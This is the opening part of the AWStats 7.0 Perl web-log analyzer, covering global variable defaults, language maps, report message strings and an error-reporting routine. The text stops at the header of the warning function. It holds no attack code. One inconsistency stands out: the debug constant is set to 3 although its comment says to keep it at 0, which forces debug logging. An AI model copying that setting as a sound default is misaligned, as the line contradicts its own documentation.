#!/usr/bin/perl
#------------------------------------------------------------------------------
# Free realtime web server logfile analyzer to show advanced web statistics.
# Works from command line or as a CGI. You must use this script as often as
# necessary from your scheduler to update your statistics and from command
# line or a browser to read report results.
# See AWStats documentation (in docs/ directory) for all setup instructions.
#------------------------------------------------------------------------------
# $Revision: 1.971 $ - $Author: eldy $ - $Date: 2010/10/16 17:24:03 $
require 5.007;
#$|=1;
#use warnings;        # Must be used in test mode only. This reduce a little process speed
#use diagnostics;    # Must be used in test mode only. This reduce a lot of process speed
use strict;
no strict "refs";
use Time::Local
  ; # use Time::Local 'timelocal_nocheck' is faster but not supported by all Time::Local modules
use Socket;
#use Encode;

#------------------------------------------------------------------------------
# Defines
#------------------------------------------------------------------------------
use vars qw/ $REVISION $VERSION /;
$REVISION = '$Revision: 1.971 $';
$REVISION =~ /\s(.*)\s/;
$REVISION = $1;
$VERSION  = "7.0 (build $REVISION)";

# ----- Constants -----
use vars qw/
  $DEBUGFORCED $NBOFLINESFORBENCHMARK $FRAMEWIDTH $NBOFLASTUPDATELOOKUPTOSAVE
  $LIMITFLUSH $NEWDAYVISITTIMEOUT $VISITTIMEOUT $NOTSORTEDRECORDTOLERANCE
  $WIDTHCOLICON $TOOLTIPON
  $lastyearbeforeupdate $lastmonthbeforeupdate $lastdaybeforeupdate $lasthourbeforeupdate $lastdatebeforeupdate
  $NOHTML
  /;
$DEBUGFORCED = 3
  ; # Force debug level to log lesser level into debug.log file (Keep this value to 0)
$NBOFLINESFORBENCHMARK = 8192
  ; # Benchmark info are printing every NBOFLINESFORBENCHMARK lines (Must be a power of 2)
$FRAMEWIDTH = 240;    # Width of left frame when UseFramesWhenCGI is on
$NBOFLASTUPDATELOOKUPTOSAVE =
  500;                # Nb of records to save in DNS last update cache file
$LIMITFLUSH =
  5000;   # Nb of records in data arrays after how we need to flush data on disk
$NEWDAYVISITTIMEOUT = 764041;    # Delay between 01-23:59:59 and 02-00:00:00
$VISITTIMEOUT       = 10000
  ; # Lapse of time to consider a page load as a new visit. 10000 = 1 hour (Default = 10000)
$NOTSORTEDRECORDTOLERANCE = 20000
  ; # Lapse of time to accept a record if not in correct order. 20000 = 2 hour (Default = 20000)
$WIDTHCOLICON = 32;
$TOOLTIPON    = 0;    # Tooltips plugin loaded
$NOHTML       = 0;    # Suppress the html headers

# ----- Running variables -----
use vars qw/
  $DIR $PROG $Extension
  $Debug $ShowSteps
  $DebugResetDone $DNSLookupAlreadyDone
  $RunAsCli $UpdateFor $HeaderHTTPSent $HeaderHTMLSent
  $LastLine $LastLineNumber $LastLineOffset $LastLineChecksum $LastUpdate
  $lowerval
  $PluginMode
  $MetaRobot
  $AverageVisits $AveragePages $AverageHits $AverageBytes
  $TotalUnique $TotalVisits $TotalHostsKnown $TotalHostsUnknown
  $TotalPages $TotalHits $TotalBytes $TotalHitsErrors
  $TotalNotViewedPages $TotalNotViewedHits $TotalNotViewedBytes
  $TotalEntries $TotalExits $TotalBytesPages $TotalDifferentPages
  $TotalKeyphrases $TotalKeywords $TotalDifferentKeyphrases $TotalDifferentKeywords
  $TotalSearchEnginesPages $TotalSearchEnginesHits $TotalRefererPages $TotalRefererHits $TotalDifferentSearchEngines $TotalDifferentReferer
  $FrameName $Center $FileConfig $FileSuffix $Host $YearRequired $MonthRequired $DayRequired $HourRequired
  $QueryString $SiteConfig $StaticLinks $PageCode $PageDir $PerlParsingFormat $UserAgent
  $pos_vh $pos_host $pos_logname $pos_date $pos_tz $pos_method $pos_url $pos_code $pos_size
  $pos_referer $pos_agent $pos_query $pos_gzipin $pos_gzipout $pos_compratio $pos_timetaken
  $pos_cluster $pos_emails $pos_emailr $pos_hostr @pos_extra $pos_httpx $pos_web
  /;
$DIR = $PROG = $Extension = '';
$Debug          = $ShowSteps            = 0;
$DebugResetDone = $DNSLookupAlreadyDone = 0;
$RunAsCli       = $UpdateFor            = $HeaderHTTPSent = $HeaderHTMLSent = 0;
$LastLine = $LastLineNumber = $LastLineOffset = $LastLineChecksum = 0;
$LastUpdate          = 0;
$lowerval            = 0;
$PluginMode          = '';
$MetaRobot           = 0;
$AverageVisits = $AveragePages = $AverageHits = $AverageBytes = 0; 
$TotalUnique         = $TotalVisits = $TotalHostsKnown = $TotalHostsUnknown = 0;
$TotalPages          = $TotalHits = $TotalBytes = $TotalHitsErrors = 0;
$TotalNotViewedPages = $TotalNotViewedHits = $TotalNotViewedBytes = 0;
$TotalEntries = $TotalExits = $TotalBytesPages = $TotalDifferentPages = 0;
$TotalKeyphrases = $TotalKeywords = $TotalDifferentKeyphrases = 0;
$TotalDifferentKeywords = 0;
$TotalSearchEnginesPages = $TotalSearchEnginesHits = $TotalRefererPages = 0;
$TotalRefererHits = $TotalDifferentSearchEngines = $TotalDifferentReferer = 0;
(
    $FrameName,    $Center,       $FileConfig,        $FileSuffix,
    $Host,         $YearRequired, $MonthRequired,     $DayRequired,
    $HourRequired, $QueryString,  $SiteConfig,        $StaticLinks,
    $PageCode,     $PageDir,      $PerlParsingFormat, $UserAgent
)
  = ('', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '');

# ----- Plugins variable -----
use vars qw/ %PluginsLoaded $PluginDir $AtLeastOneSectionPlugin /;
%PluginsLoaded           = ();
$PluginDir               = '';
$AtLeastOneSectionPlugin = 0;

# ----- Time vars -----
use vars qw/
  $starttime
  $nowtime $tomorrowtime
  $nowweekofmonth $nowweekofyear $nowdaymod $nowsmallyear
  $nowsec $nowmin $nowhour $nowday $nowmonth $nowyear $nowwday $nowyday $nowns
  $StartSeconds $StartMicroseconds
  /;
$StartSeconds = $StartMicroseconds = 0;

# ----- Variables for config file reading -----
use vars qw/
  $FoundNotPageList
  /;
$FoundNotPageList = 0;

# ----- Config file variables -----
use vars qw/
  $StaticExt
  $DNSStaticCacheFile
  $DNSLastUpdateCacheFile
  $MiscTrackerUrl
  $Lang
  $MaxRowsInHTMLOutput
  $MaxLengthOfShownURL
  $MaxLengthOfStoredURL
  $MaxLengthOfStoredUA
  %BarPng
  $BuildReportFormat
  $BuildHistoryFormat
  $ExtraTrackedRowsLimit
  $DatabaseBreak
  $SectionsToBeSaved
  /;
$StaticExt              = 'html';
$DNSStaticCacheFile     = 'dnscache.txt';
$DNSLastUpdateCacheFile = 'dnscachelastupdate.txt';
$MiscTrackerUrl         = '/js/awstats_misc_tracker.js';
$Lang                   = 'auto';
$SectionsToBeSaved      = 'all';
$MaxRowsInHTMLOutput    = 1000;
$MaxLengthOfShownURL    = 64;
$MaxLengthOfStoredURL = 256;  # Note: Apache LimitRequestLine is default to 8190
$MaxLengthOfStoredUA  = 256;
%BarPng               = (
    'vv' => 'vv.png',
    'vu' => 'vu.png',
    'hu' => 'hu.png',
    'vp' => 'vp.png',
    'hp' => 'hp.png',
    'he' => 'he.png',
    'hx' => 'hx.png',
    'vh' => 'vh.png',
    'hh' => 'hh.png',
    'vk' => 'vk.png',
    'hk' => 'hk.png'
);
$BuildReportFormat     = 'html';
$BuildHistoryFormat    = 'text';
$ExtraTrackedRowsLimit = 500;
$DatabaseBreak         = 'month';
use vars qw/
  $DebugMessages $AllowToUpdateStatsFromBrowser $EnableLockForUpdate $DNSLookup $AllowAccessFromWebToAuthenticatedUsersOnly
  $BarHeight $BarWidth $CreateDirDataIfNotExists $KeepBackupOfHistoricFiles
  $NbOfLinesParsed $NbOfLinesDropped $NbOfLinesCorrupted $NbOfLinesComment $NbOfLinesBlank $NbOfOldLines $NbOfNewLines
  $NbOfLinesShowsteps $NewLinePhase $NbOfLinesForCorruptedLog $PurgeLogFile $ArchiveLogRecords
  $ShowDropped $ShowCorrupted $ShowUnknownOrigin $ShowDirectOrigin $ShowLinksToWhoIs
  $ShowAuthenticatedUsers $ShowFileSizesStats $ShowScreenSizeStats $ShowSMTPErrorsStats
  $ShowEMailSenders $ShowWormsStats $ShowClusterStats
  $IncludeInternalLinksInOriginSection
  $AuthenticatedUsersNotCaseSensitive
  $Expires $UpdateStats $URLNotCaseSensitive $URLWithQuery $URLReferrerWithQuery
  $DecodeUA
  /;
(
    $DebugMessages,
    $AllowToUpdateStatsFromBrowser,
    $EnableLockForUpdate,
    $DNSLookup,
    $AllowAccessFromWebToAuthenticatedUsersOnly,
    $BarHeight,
    $BarWidth,
    $CreateDirDataIfNotExists,
    $KeepBackupOfHistoricFiles,
    $NbOfLinesParsed,
    $NbOfLinesDropped,
    $NbOfLinesCorrupted,
    $NbOfLinesComment,
    $NbOfLinesBlank,
    $NbOfOldLines,
    $NbOfNewLines,
    $NbOfLinesShowsteps,
    $NewLinePhase,
    $NbOfLinesForCorruptedLog,
    $PurgeLogFile,
    $ArchiveLogRecords,
    $ShowDropped,
    $ShowCorrupted,
    $ShowUnknownOrigin,
    $ShowDirectOrigin,
    $ShowLinksToWhoIs,
    $ShowAuthenticatedUsers,
    $ShowFileSizesStats,
    $ShowScreenSizeStats,
    $ShowSMTPErrorsStats,
    $ShowEMailSenders,
    $ShowWormsStats,
    $ShowClusterStats,
    $IncludeInternalLinksInOriginSection,
    $AuthenticatedUsersNotCaseSensitive,
    $Expires,
    $UpdateStats,
    $URLNotCaseSensitive,
    $URLWithQuery,
    $URLReferrerWithQuery,
    $DecodeUA
)
  = (0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
use vars qw/
  $DetailedReportsOnNewWindows
  $FirstDayOfWeek $KeyWordsNotSensitive $SaveDatabaseFilesWithPermissionsForEveryone
  $WarningMessages $ShowLinksOnUrl $UseFramesWhenCGI
  $ShowMenu $ShowMonthStats $ShowDaysOfMonthStats $ShowDaysOfWeekStats
  $ShowHoursStats $ShowDomainsStats
  $ShowRobotsStats $ShowSessionsStats $ShowPagesStats $ShowFileTypesStats $ShowDownloadsStats
  $ShowOSStats $ShowBrowsersStats $ShowOriginStats
  $ShowKeyphrasesStats $ShowKeywordsStats $ShowMiscStats $ShowHTTPErrorsStats
  $AddDataArrayMonthStats $AddDataArrayShowDaysOfMonthStats $AddDataArrayShowDaysOfWeekStats $AddDataArrayShowHoursStats
  /;
(
    $DetailedReportsOnNewWindows,
    $FirstDayOfWeek,
    $KeyWordsNotSensitive,
    $SaveDatabaseFilesWithPermissionsForEveryone,
    $WarningMessages,
    $ShowLinksOnUrl,
    $UseFramesWhenCGI,
    $ShowMenu,
    $ShowMonthStats,
    $ShowDaysOfMonthStats,
    $ShowDaysOfWeekStats,
    $ShowHoursStats,
    $ShowDomainsStats,
    $ShowRobotsStats,
    $ShowSessionsStats,
    $ShowPagesStats,
    $ShowFileTypesStats,
    $ShowDownloadsStats,
    $ShowOSStats,
    $ShowBrowsersStats,
    $ShowOriginStats,
    $ShowKeyphrasesStats,
    $ShowKeywordsStats,
    $ShowMiscStats,
    $ShowHTTPErrorsStats,
    $AddDataArrayMonthStats,
    $AddDataArrayShowDaysOfMonthStats,
    $AddDataArrayShowDaysOfWeekStats,
    $AddDataArrayShowHoursStats
)
  = (
    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1
);
use vars qw/
  $AllowFullYearView
  $LevelForRobotsDetection $LevelForWormsDetection $LevelForBrowsersDetection $LevelForOSDetection $LevelForRefererAnalyze
  $LevelForFileTypesDetection $LevelForSearchEnginesDetection $LevelForKeywordsDetection
  /;
(
    $AllowFullYearView,          $LevelForRobotsDetection,
    $LevelForWormsDetection,     $LevelForBrowsersDetection,
    $LevelForOSDetection,        $LevelForRefererAnalyze,
    $LevelForFileTypesDetection, $LevelForSearchEnginesDetection,
    $LevelForKeywordsDetection
)
  = (2, 2, 0, 2, 2, 2, 2, 2, 2);
use vars qw/
  $DirLock $DirCgi $DirData $DirIcons $DirLang $AWScript $ArchiveFileName
  $AllowAccessFromWebToFollowingIPAddresses $HTMLHeadSection $HTMLEndSection $LinksToWhoIs $LinksToIPWhoIs
  $LogFile $LogType $LogFormat $LogSeparator $Logo $LogoLink $StyleSheet $WrapperScript $SiteDomain
  $UseHTTPSLinkForUrl $URLQuerySeparators $URLWithAnchor $ErrorMessages $ShowFlagLinks
  /;
(
    $DirLock,                                  $DirCgi,
    $DirIcons,                                 $DirLang,
    $AWScript,                                 $ArchiveFileName,
    $AllowAccessFromWebToFollowingIPAddresses, $HTMLHeadSection,
    $HTMLEndSection,                           $LinksToWhoIs,
    $LinksToIPWhoIs,                           $LogFile,
    $LogType,                                  $LogFormat,
    $LogSeparator,                             $Logo,
    $LogoLink,                                 $StyleSheet,
    $WrapperScript,                            $SiteDomain,
    $UseHTTPSLinkForUrl,                       $URLQuerySeparators,
    $URLWithAnchor,                            $ErrorMessages,
    $ShowFlagLinks,                            $DirData,
)
  = (
    '', '', '', '', '', '', '', '', '', '', '', '', '',
    '', '', '', '', '', '', '', '', '', '', '', '', ''
);

# ---------- Init arrays --------
use vars qw/
  @RobotsSearchIDOrder_list1 @RobotsSearchIDOrder_list2 @RobotsSearchIDOrder_listgen
  @SearchEnginesSearchIDOrder_list1 @SearchEnginesSearchIDOrder_list2 @SearchEnginesSearchIDOrder_listgen
  @BrowsersSearchIDOrder @OSSearchIDOrder @WordsToExtractSearchUrl @WordsToCleanSearchUrl
  @WormsSearchIDOrder
  @RobotsSearchIDOrder @SearchEnginesSearchIDOrder
  @_from_p @_from_h
  @_time_p @_time_h @_time_k @_time_nv_p @_time_nv_h @_time_nv_k
  @DOWIndex @fieldlib @keylist
  /;
@RobotsSearchIDOrder = @SearchEnginesSearchIDOrder = ();
@_from_p = @_from_h = ();
@_time_p = @_time_h = @_time_k = @_time_nv_p = @_time_nv_h = @_time_nv_k = ();
@DOWIndex = @fieldlib = @keylist = ();
use vars qw/
  @MiscListOrder %MiscListCalc
  %OSFamily %BrowsersFamily @SessionsRange %SessionsAverage
  %LangBrowserToLangAwstats %LangAWStatsToFlagAwstats %BrowsersSafariBuildToVersionHash
  @HostAliases @AllowAccessFromWebToFollowingAuthenticatedUsers
  @DefaultFile @SkipDNSLookupFor
  @SkipHosts @SkipUserAgents @SkipFiles @SkipReferrers @NotPageFiles
  @OnlyHosts @OnlyUserAgents @OnlyFiles @OnlyUsers
  @URLWithQueryWithOnly @URLWithQueryWithout
  @ExtraName @ExtraCondition @ExtraStatTypes @MaxNbOfExtra @MinHitExtra
  @ExtraFirstColumnTitle @ExtraFirstColumnValues @ExtraFirstColumnFunction @ExtraFirstColumnFormat
  @ExtraCodeFilter @ExtraConditionType @ExtraConditionTypeVal
  @ExtraFirstColumnValuesType @ExtraFirstColumnValuesTypeVal
  @ExtraAddAverageRow @ExtraAddSumRow
  @PluginsToLoad
  /;
@MiscListOrder = (
    'AddToFavourites',  'JavascriptDisabled',
    'JavaEnabled',      'DirectorSupport',
    'FlashSupport',     'RealPlayerSupport',
    'QuickTimeSupport', 'WindowsMediaPlayerSupport',
    'PDFSupport'
);
%MiscListCalc = (
    'TotalMisc'                 => '',
    'AddToFavourites'           => 'u',
    'JavascriptDisabled'        => 'hm',
    'JavaEnabled'               => 'hm',
    'DirectorSupport'           => 'hm',
    'FlashSupport'              => 'hm',
    'RealPlayerSupport'         => 'hm',
    'QuickTimeSupport'          => 'hm',
    'WindowsMediaPlayerSupport' => 'hm',
    'PDFSupport'                => 'hm'
);
@SessionsRange =
  ('0s-30s', '30s-2mn', '2mn-5mn', '5mn-15mn', '15mn-30mn', '30mn-1h', '1h+');
%SessionsAverage = (
    '0s-30s',   15,  '30s-2mn',   75,   '2mn-5mn', 210,
    '5mn-15mn', 600, '15mn-30mn', 1350, '30mn-1h', 2700,
    '1h+',      3600
);

# HTTP-Accept or Lang parameter => AWStats code to use for lang
# ISO-639-1 or 2 or other       => awstats-xx.txt where xx is ISO-639-1
%LangBrowserToLangAwstats = (
    'sq'    => 'al',
    'ar'    => 'ar',
    'ba'    => 'ba',
    'bg'    => 'bg',
    'zh-tw' => 'tw',
    'zh'    => 'cn',
    'cs'    => 'cz',
    'de'    => 'de',
    'da'    => 'dk',
    'en'    => 'en',
    'et'    => 'et',
    'fi'    => 'fi',
    'fr'    => 'fr',
    'gl'    => 'gl',
    'es'    => 'es',
    'eu'    => 'eu',
    'ca'    => 'ca',
    'el'    => 'gr',
    'hu'    => 'hu',
    'is'    => 'is',
    'in'    => 'id',
    'it'    => 'it',
    'ja'    => 'jp',
    'kr'    => 'ko',
    'lv'    => 'lv',
    'nl'    => 'nl',
    'no'    => 'nb',
    'nb'    => 'nb',
    'nn'    => 'nn',
    'pl'    => 'pl',
    'pt'    => 'pt',
    'pt-br' => 'br',
    'ro'    => 'ro',
    'ru'    => 'ru',
    'sr'    => 'sr',
    'sk'    => 'sk',
    'sv'    => 'se',
    'th'    => 'th',
    'tr'    => 'tr',
    'uk'    => 'ua',
    'cy'    => 'cy',
    'wlk'   => 'cy'
);
%LangAWStatsToFlagAwstats =
  ( # If flag (country ISO-3166 two letters) is not same than AWStats Lang code
    'ca' => 'es_cat',
    'et' => 'ee',
    'eu' => 'es_eu',
    'cy' => 'wlk',
    'gl' => 'glg',
    'he' => 'il',
    'ko' => 'kr',
    'ar' => 'sa',
    'sr' => 'cs'
);

@HostAliases = @AllowAccessFromWebToFollowingAuthenticatedUsers = ();
@DefaultFile = @SkipDNSLookupFor = ();
@SkipHosts = @SkipUserAgents = @NotPageFiles = @SkipFiles = @SkipReferrers = ();
@OnlyHosts = @OnlyUserAgents = @OnlyFiles = @OnlyUsers = ();
@URLWithQueryWithOnly     = @URLWithQueryWithout    = ();
@ExtraName                = @ExtraCondition         = @ExtraStatTypes = ();
@MaxNbOfExtra             = @MinHitExtra            = ();
@ExtraFirstColumnTitle    = @ExtraFirstColumnValues = ();
@ExtraFirstColumnFunction = @ExtraFirstColumnFormat = ();
@ExtraCodeFilter = @ExtraConditionType = @ExtraConditionTypeVal = ();
@ExtraFirstColumnValuesType = @ExtraFirstColumnValuesTypeVal = ();
@ExtraAddAverageRow         = @ExtraAddSumRow                = ();
@PluginsToLoad              = ();

# ---------- Init hash arrays --------
use vars qw/
  %BrowsersHashIDLib %BrowsersHashIcon %BrowsersHereAreGrabbers
  %DomainsHashIDLib
  %MimeHashLib %MimeHashFamily
  %OSHashID %OSHashLib
  %RobotsHashIDLib %RobotsAffiliateLib
  %SearchEnginesHashID %SearchEnginesHashLib %SearchEnginesWithKeysNotInQuery %SearchEnginesKnownUrl %NotSearchEnginesKeys
  %WormsHashID %WormsHashLib %WormsHashTarget
  /;
use vars qw/
  %HTMLOutput %NoLoadPlugin %FilterIn %FilterEx
  %MonthNumLib
  %ValidHTTPCodes %ValidSMTPCodes
  %TrapInfosForHTTPErrorCodes %NotPageList %DayBytes %DayHits %DayPages %DayVisits
  %MaxNbOf %MinHit
  %ListOfYears %HistoryAlreadyFlushed %PosInFile %ValueInFile
  %val %nextval %egal
  %TmpDNSLookup %TmpOS %TmpRefererServer %TmpRobot %TmpBrowser %MyDNSTable
  /;
%HTMLOutput = %NoLoadPlugin = %FilterIn = %FilterEx = ();
%MonthNumLib                = ();
%ValidHTTPCodes             = %ValidSMTPCodes = ();
%TrapInfosForHTTPErrorCodes = ();
$TrapInfosForHTTPErrorCodes{404 } = 1;    # TODO Add this in config file
%NotPageList = ();
%DayBytes    = %DayHits               = %DayPages  = %DayVisits   = ();
%MaxNbOf     = %MinHit                = ();
%ListOfYears = %HistoryAlreadyFlushed = %PosInFile = %ValueInFile = ();
%val = %nextval = %egal = ();
%TmpDNSLookup = %TmpOS = %TmpRefererServer = %TmpRobot = %TmpBrowser = ();
%MyDNSTable = ();
use vars qw/
  %FirstTime %LastTime
  %MonthHostsKnown %MonthHostsUnknown
  %MonthUnique %MonthVisits
  %MonthPages %MonthHits %MonthBytes
  %MonthNotViewedPages %MonthNotViewedHits %MonthNotViewedBytes
  %_session %_browser_h
  %_domener_p %_domener_h %_domener_k %_errors_h %_errors_k
  %_filetypes_h %_filetypes_k %_filetypes_gz_in %_filetypes_gz_out
  %_host_p %_host_h %_host_k %_host_l %_host_s %_host_u
  %_waithost_e %_waithost_l %_waithost_s %_waithost_u
  %_keyphrases %_keywords %_os_h %_pagesrefs_p %_pagesrefs_h %_robot_h %_robot_k %_robot_l %_robot_r
  %_worm_h %_worm_k %_worm_l %_login_h %_login_p %_login_k %_login_l %_screensize_h
  %_misc_p %_misc_h %_misc_k
  %_cluster_p %_cluster_h %_cluster_k
  %_se_referrals_p %_se_referrals_h %_sider404_h %_referer404_h %_url_p %_url_k %_url_e %_url_x
  %_downloads
  %_unknownreferer_l %_unknownrefererbrowser_l
  %_emails_h %_emails_k %_emails_l %_emailr_h %_emailr_k %_emailr_l
  %_webagent_hits %_webagent_bandwith
  /;
&Init_HashArray();

# ---------- Init Regex --------
use vars qw/ $regclean1 $regclean2 $regdate /;
$regclean1 = qr/<(recnb|\/td)>/i;
$regclean2 = qr/<\/?[^<>]+>/i;
$regdate   = qr/(\d\d\d\d)(\d\d)(\d\d)(\d\d)(\d\d)(\d\d)/;

# ---------- Init Tie::hash arrays --------
# Didn't find a tie that increase speed
#use Tie::StdHash;
#use Tie::Cache::LRU;
#tie %_host_p, 'Tie::StdHash';
#tie %TmpOS, 'Tie::Cache::LRU';

# PROTOCOL CODES
use vars qw/ %httpcodelib %ftpcodelib %smtpcodelib /;

# DEFAULT MESSAGE
use vars qw/ @Message /;
@Message = (
    'Unknown',
    'Unknown (unresolved ip)',
    'Others',
    'View details',
    'Day',
    'Month',
    'Year',
    'Statistics for',
    'First visit',
    'Last visit',
    'Number of visits',
    'Unique visitors',
    'Visit',
    'different keywords',
    'Search',
    'Percent',
    'Traffic',
    'Domains/Countries',
    'Visitors',
    'Pages-URL',
    'Hours',
    'Browsers',
    '',
    'Referers',
    'Never updated (See \'Build/Update\' on awstats_setup.html page)',
    'Visitors domains/countries',
    'hosts',
    'pages',
    'different pages-url',
    'Viewed',
    'Other words',
    'Pages not found',
    'HTTP Error codes',
    'Netscape versions',
    'IE versions',
    'Last Update',
    'Connect to site from',
    'Origin',
    'Direct address / Bookmarks',
    'Origin unknown',
    'Links from an Internet Search Engine',
    'Links from an external page (other web sites except search engines)',
    'Links from an internal page (other page on same site)',
    'Keyphrases used on search engines',
    'Keywords used on search engines',
    'Unresolved IP Address',
    'Unknown OS (Referer field)',
    'Required but not found URLs (HTTP code 404)',
    'IP Address',
    'Error&nbsp;Hits',
    'Unknown browsers (Referer field)',
    'different robots',
    'visits/visitor',
    'Robots/Spiders visitors',
    'Free realtime logfile analyzer for advanced web statistics',
    'of',
    'Pages',
    'Hits',
    'Versions',
    'Operating Systems',
    'Jan',
    'Feb',
    'Mar',
    'Apr',
    'May',
    'Jun',
    'Jul',
    'Aug',
    'Sep',
    'Oct',
    'Nov',
    'Dec',
    'Navigation',
    'File type',
    'Update now',
    'Bandwidth',
    'Back to main page',
    'Top',
    'dd mmm yyyy - HH:MM',
    'Filter',
    'Full list',
    'Hosts',
    'Known',
    'Robots',
    'Sun',
    'Mon',
    'Tue',
    'Wed',
    'Thu',
    'Fri',
    'Sat',
    'Days of week',
    'Who',
    'When',
    'Authenticated users',
    'Min',
    'Average',
    'Max',
    'Web compression',
    'Bandwidth saved',
    'Compression on',
    'Compression result',
    'Total',
    'different keyphrases',
    'Entry',
    'Code',
    'Average size',
    'Links from a NewsGroup',
    'KB',
    'MB',
    'GB',
    'Grabber',
    'Yes',
    'No',
    'Info.',
    'OK',
    'Exit',
    'Visits duration',
    'Close window',
    'Bytes',
    'Search&nbsp;Keyphrases',
    'Search&nbsp;Keywords',
    'different refering search engines',
    'different refering sites',
    'Other phrases',
    'Other logins (and/or anonymous users)',
    'Refering search engines',
    'Refering sites',
    'Summary',
    'Exact value not available in "Year" view',
    'Data value arrays',
    'Sender EMail',
    'Receiver EMail',
    'Reported period',
    'Extra/Marketing',
    'Screen sizes',
    'Worm/Virus attacks',
    'Hit on favorite icon',
    'Days of month',
    'Miscellaneous',
    'Browsers with Java support',
    'Browsers with Macromedia Director Support',
    'Browsers with Flash Support',
    'Browsers with Real audio playing support',
    'Browsers with Quictime audio playing support',
    'Browsers with Windows Media audio playing support',
    'Browsers with PDF support',
    'SMTP Error codes',
    'Countries',
    'Mails',
    'Size',
    'First',
    'Last',
    'Exclude filter',
    'Codes shown here gave hits or traffic "not viewed" by visitors, so they are not included in other charts.',
    'Cluster',
    'Robots shown here gave hits or traffic "not viewed" by visitors, so they are not included in other charts.',
    'Numbers after + are successful hits on "robots.txt" files',
    'Worms shown here gave hits or traffic "not viewed" by visitors, so thay are not included in other charts.',
    'Not viewed traffic includes traffic generated by robots, worms, or replies with special HTTP status codes.',
    'Traffic viewed',
    'Traffic not viewed',
    'Monthly history',
    'Worms',
    'different worms',
    'Mails successfully sent',
    'Mails failed/refused',
    'Sensitive targets',
    'Javascript disabled',
    'Created by',
    'plugins',
    'Regions',
    'Cities',
    'Opera versions',
    'Safari versions',
    'Chrome versions',
    'Konqueror versions',
    ',',
     'Downloads',
);

#------------------------------------------------------------------------------
# Functions
#------------------------------------------------------------------------------

# Function to solve pb with openvms
sub file_filt (@)
{
    my @retval;
    foreach my $fl (@_){
        $fl =~ tr/^//d;
        push @retval, $fl;
    }
    return sort @retval;
 }

#------------------------------------------------------------------------------
# Function:        Write error message and exit
# Parameters:    $message $secondmessage $thirdmessage $donotshowsetupinfo
# Input:        $HeaderHTTPSent $HeaderHTMLSent %HTMLOutput $LogSeparator $LogFormat
# Output:        None
# Return:        None
#------------------------------------------------------------------------------
sub error
{
    my $message            = shift || '';
    my $secondmessage      = shift || '';
    my $thirdmessage       = shift || '';
    my $donotshowsetupinfo = shift || 0;
    my $tagbold     = '';
    my $tagunbold   = '';
    my $tagbr       = '';
    my $tagfontred  = '';
    my $tagfontgrey = '';
    my $tagunfont   = '';
    
    if(!$ErrorMessages && $message =~ /^Format error$/i){
        # Files seems to have bad format
        if($message !~ $LogSeparator){
            # Bad LogSeparator parameter
            print "${tagfontred }AWStats did not found the ${tagbold }LogSeparator${tagunbold } ".
                  "in your log records.${tagbr }${tagunfont }\n";
        }else{
            # Bad LogFormat parameter
            print "AWStats did not find any valid log lines that match your ".
                  "${tagbold }LogFormat${tagunbold } parameter, in the ".
                  "${NbOfLinesForCorruptedLog }th first non commented ".
                  "lines read of your log.${tagbr }\n";
            print "${tagfontred }Your log file ${tagbold }$thirdmessage${tagunbold } ".
                  "must have a bad format or ${tagbold }LogFormat${tagunbold } ".
                  "parameter setup does not match this format.${tagbr }${tagbr }${tagunfont }\n";
            print "Your AWStats ${tagbold }LogFormat${tagunbold } parameter is:\n";
            print "${tagbold }$LogFormat${tagunbold }${tagbr }\n";
            print "This means each line in your web server log file need to have ";
            
            if($LogFormat == 1){
                print "${tagbold }\"combined log format\"${tagunbold } like this:${tagbr }\n";
                print "111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" ".
                      "200 1234 \"http://www.fromserver.com/from.htm\" \"Mozilla/4.0 ".
                      "(compatible; MSIE 5.01; Windows NT 5.0)\"\n";
            }
            if($LogFormat == 2){
                print "${tagbold }\"MSIE Extended W3C log format\"${tagunbold } like this:${tagbr }\n";
                print "date time c-ip c-username cs-method cs-uri-sterm sc-status ".
                      "sc-bytes cs-version cs(User-Agent) cs(Referer)\n";
            }
            if($LogFormat == 3){
                print "${tagbold }\"WebStar native log format\"${tagunbold }${tagbr }\n";
            }
            if($LogFormat == 4){
                print "${tagbold }\"common log format\"${tagunbold } like this:${tagbr }\n";
                print "111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234\n";
            }
            if($LogFormat == 6){
            print "${tagbold }\"Lotus Notes/Lotus Domino\"${tagunbold }${tagbr }\n";
            print "111.22.33.44 - Firstname Middlename Lastname [10/Jan/2001:02:14:14 +0200] ".
                  "\"GET / HTTP/1.1\" 200 1234 \"http://www.fromserver.com/from.htm\" ".
                  "\"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
            }
            if($LogFormat !~ /^[1-6]$/){
                print "the following personalized log format:${tagbr }\n";
                print "$LogFormat\n";
            }
            print "And this is an example of records AWStats found in your log file ".
                  "(the record number $NbOfLinesForCorruptedLog in your log):\n";
            print "$secondmessage";
            print "\n";
        }
    }else{
        print($ErrorMessages? "$ErrorMessages" : "Error: $message\n");
    }
    
    if(!$ErrorMessages && !$donotshowsetupinfo){
        if($message =~ /Couldn.t open config file/i){
            my $dir = $DIR;
            if($dir =~ /^\./){
                $dir .= '/../..';
            }else{
                $dir =~ s/[\\\/]?wwwroot[\/\\]cgi-bin[\\\/]?//;
            }
            print "${tagbr }\n";
            
            print "- ${tagbold }Did you use correct config parameter ?${tagunbold }${tagbr }\n";
            print "Example: If your config file is awstats.mysite.conf, use -config=mysite\n";
            print "- ${tagbold }Did you create your config file 'awstats.$SiteConfig.conf' ?${tagunbold }${tagbr }\n";
            print "If not, you can run \"awstats_configure.pl\"\nfrom command line, or create it manually.${tagbr }\n";
            print "${tagbr }\n";
        }
        else{
            print "${tagbr }${tagbold }Setup (" . ($FileConfig ? "'" . $FileConfig . "'" : "Config") .
                  " file, web server or permissions) may be wrong.${tagunbold }${tagbr }\n";
        }
        print "Check config file, permissions and AWStats documentation (in 'docs' directory).\n";
    }

    # Remove lock if not a lock message
    if($EnableLockForUpdate && $message !~ /lock file/){
        &Lock_Update(0);
    }
    exit 1;
 }

#------------------------------------------------------------------------------
# Function:        Write a warning message
# Parameters:    $message
# Input:        $HeaderHTTPSent $HeaderHTMLSent $WarningMessage %HTMLOutput
